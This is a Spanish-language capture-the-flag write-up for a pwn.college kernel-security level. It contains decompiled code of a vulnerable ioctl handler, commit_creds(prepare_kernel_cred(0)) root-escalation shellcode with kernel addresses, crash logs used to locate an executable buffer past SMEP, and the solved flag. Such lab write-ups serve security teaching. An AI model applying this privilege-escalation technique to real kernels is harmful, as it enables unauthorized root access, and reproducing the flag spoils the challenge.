# level 7.0

El primer reto relevante en el apartado de "Kernel Security" de pwncollege:
```C

/* WARNING: Function: __x86_indirect_thunk_rax repla ced with injection: x86_indirect_thunk_rax */
/* WARNING: Unknown calling convention */

long device_ioctl(file *file,uint cmd,ulong arg)

{
  long ret;
  long in_GS_OFFSET;
  ulong code;
  code *addr;
  long canary;
  
  canary = *(long *)(in_GS_OFFSET + 0x28);
  printk(&DAT_00100360,file,cmd,arg);
  ret = -1;
  if (cmd == 0x539) {
    _copy_from_user(&code,arg,8);
    _copy_from_user(&addr,arg + 0x1008,8);
    ret = -2;
    if (code < 0x1001) {
      _copy_from_user(shellcode,arg + 8);
      (*addr)();
      ret = 0;
    }
  }
  if (canary != *(long *)(in_GS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return * /
    __stack_chk_fail();
  }
  return ret;
}
```

Nos permiten ingresar shellcode y redirigir la ejecución del kernel a la dirección que querramos. No podemos usar shellcode en userspace porque hay SMEP:
```
cat /proc/cpuinfo|grep -o smep
smep
smep
```

Como en los niveles anteriores, no existe KASLR y usamos un shellcode básico:
```
   # commit_creds(prepare_kernel_cred(0))
   0:   bf 00 00 00 00          mov    edi, 0x0
   5:   48 c7 c3 60 96 08 81    mov    rbx, 0xffffffff81089660
   c:   ff d3                   call   rbx
   e:   48 89 c7                mov    rdi, rax
  11:   48 c7 c3 10 93 08 81    mov    rbx, 0xffffffff81089310
  18:   ff d3                   call   rbx
  1a:   c3                      ret
```

No podemos redirigir la ejecución la dirección de la variable `shellcode` porque se encuentra en .bss y no es ejecutable (/sys/module/challenge/sections/.bss + offset =  0xffffffffc0002440 + 0x8):
```
[   30.862501] kernel tried to execute NX-protected page - exploit attempt? (uid: 1000)
[   30.865603] BUG: unable to handle page fault for address: ffffffffc0002448
[   30.868374] #PF: supervisor instruction fetch in kernel mode
[   30.870634] #PF: error_code(0x0011) - permissions violation
```

Pero de todas formas no se usa `&shellcode` sino que shellcode contiene una dirección del montículo del kernel:
```
// En init_module
shellcode = (uchar *)__vmalloc(0x1000,0xcc0,(uint)__ _default_kernel_pte_mask & 0x163);
// En device_ioctl
_copy_from_user(shellcode,arg + 8);
```

Usa [__vmalloc](https://docs.huihoo.com/doxygen/linux/kernel/3.7/vmalloc_8h.html): `void * __vmalloc (unsigned long size, gfp_t gfp_mask, pgprot_t prot)`. Su tercer parámetro son protecciones de página y [según osdev](https://wiki.osdev.org/X86_Paging) el bit 64 es "XD" o 'Execute Disable', o sea si este bit esta deshabilitado la página es ejecutable:
```
Page Map Table Entries
Page map table entry structure (page-sized)

New bits have been added to page map table entries for long-mode paging:

    XD, or 'Execute Disable'. If the NXE bit (bit 11) is set in the EFER register, then instructions are not allowed to be executed at addresses within the page whenever XD is set. If EFER.NXE bit is 0, then the XD bit is reserved and should be set to 0.
```

Podemos ver que efectivamente no está activo: `0x163 & (1 << 63) = 0`.

Se me ocurrió ejecutar la vm como root y forzar un crash para ver la dirección que contiene `ffffffffc0002448` (`shellcode`), ya que al momento del impacto el puntero a instrucción apunta allí:
```
[   44.977330] BUG: unable to handle page fault for address: ffffffffc0002448
[   44.981825] #PF: supervisor instruction fetch in kernel mode
[   44.985727] #PF: error_code(0x0011) - permissions violation
[   44.989123] PGD 240c067 P4D 240c067 PUD 240e067 PMD 7c694067 PTE 800000007c692063
[   44.993834] Oops: 0011 [#1] SMP PTI
[   44.995879] CPU: 1 PID: 173 Comm: a.out Tainted: G           O      5.4.0 #1
[   44.999616] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[   45.004138] RIP: 0010:device_ioctl+0x222c/0xde4 [challenge]
[   45.006798] Code: ff ff e0 01 00 c0 ff ff ff ff 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0 68 7c 80 88 ff ff <00> 50 08 00 00 c9 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[   45.014516] RSP: 0018:ffffc9000013fe30 EFLAGS: 00010246
[   45.016738] RAX: ffffffffc0002448 RBX: 00007ffd0c563f90 RCX: 0000000000000000
[   45.019627] RDX: 0000000000000300 RSI: 00007ffd0c564298 RDI: ffffc90000085300
[   45.022510] RBP: 0000000000000539 R08: ffffffffc0002448 R09: 00000000000001ab
[   45.025376] R10: ffffc9000013fcf8 R11: ffffc9000013fcfd R12: ffffffffffffffe7
[   45.028280] R13: 00007ffd0c563f90 R14: 00007ffd0c563f90 R15: ffff88807d645b00
[   45.031175] FS:  00007f573a4e0740(0000) GS:ffff88807db00000(0000) knlGS:0000000000000000
[   45.034455] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   45.036784] CR2: ffffffffc0002448 CR3: 000000007c768002 CR4: 0000000000160ee0
[   45.039668] Call Trace:
[   45.040717]  ? device_ioctl+0x8f/0xde4 [challenge]
[   45.014516] RSP: 0018:ffffc9000013fe30 EFLAGS: 00010246
[   45.016738] RAX: ffffffffc0002448 RBX: 00007ffd0c563f90 RCX: 0000000000000000
[   45.019627] RDX: 0000000000000300 RSI: 00007ffd0c564298 RDI: ffffc90000085300
[   45.022510] RBP: 0000000000000539 R08: ffffffffc0002448 R09: 00000000000001ab
[   45.025376] R10: ffffc9000013fcf8 R11: ffffc9000013fcfd R12: ffffffffffffffe7
[   45.028280] R13: 00007ffd0c563f90 R14: 00007ffd0c563f90 R15: ffff88807d645b00
[   45.031175] FS:  00007f573a4e0740(0000) GS:ffff88807db00000(0000) knlGS:0000000000000000
[   45.034455] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   45.036784] CR2: ffffffffc0002448 CR3: 000000007c768002 CR4: 0000000000160ee0
[   45.039668] Call Trace:
[   45.040717]  ? device_ioctl+0x8f/0xde4 [challenge]
[   45.042692]  ? proc_reg_unlocked_ioctl+0x35/0x60
[   45.044577]  ? do_vfs_ioctl+0x3f0/0x650
[   45.046141]  ? ksys_ioctl+0x59/0x90
[   45.047580]  ? __x64_sys_ioctl+0x11/0x20
[   45.049184]  ? do_syscall_64+0x43/0x110
[   45.050772]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
[   45.052887] Modules linked in: challenge(O)
[   45.054609] CR2: ffffffffc0002448
[   45.055983] ---[ end trace ec50d7144223da54 ]---
[   45.057868] RIP: 0010:device_ioctl+0x222c/0xde4 [challenge]
[   45.060121] Code: ff ff e0 01 00 c0 ff ff ff ff 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 e0 68 7c 80 88 ff ff <00> 50 08 00 00 c9 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00  <----- Bingo!
[   45.067393] RSP: 0018:ffffc9000013fe30 EFLAGS: 00010246
[   45.069347] RAX: ffffffffc0002448 RBX: 00007ffd0c563f90 RCX: 0000000000000000
[   45.071999] RDX: 0000000000000300 RSI: 00007ffd0c564298 RDI: ffffc90000085300
[   45.074644] RBP: 0000000000000539 R08: ffffffffc0002448 R09: 00000000000001ab
[   45.077280] R10: ffffc9000013fcf8 R11: ffffc9000013fcfd R12: ffffffffffffffe7
[   45.080220] R13: 00007ffd0c563f90 R14: 00007ffd0c563f90 R15: ffff88807d645b00
[   45.083586] FS:  00007f573a4e0740(0000) GS:ffff88807db00000(0000) knlGS:0000000000000000
[   45.086634] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   45.088770] CR2: ffffffffc0002448 CR3: 000000007c768002 CR4: 0000000000160ee0
[   45.091607] [device_release] inode=ffff88807d07ca48, file=ffff88807d645b00
(END)
```

 "<00> 50 08 00 00 c9 ff ff" es `0xffffc900000850`, esa es la dirección que contiene nuestro shellcode y a la que debemos saltar.

 `pwn.college{QPDSOy2SSHU_G8xyrLjVtL9YPBu.dVzM0wCNwYzM5EzW}`

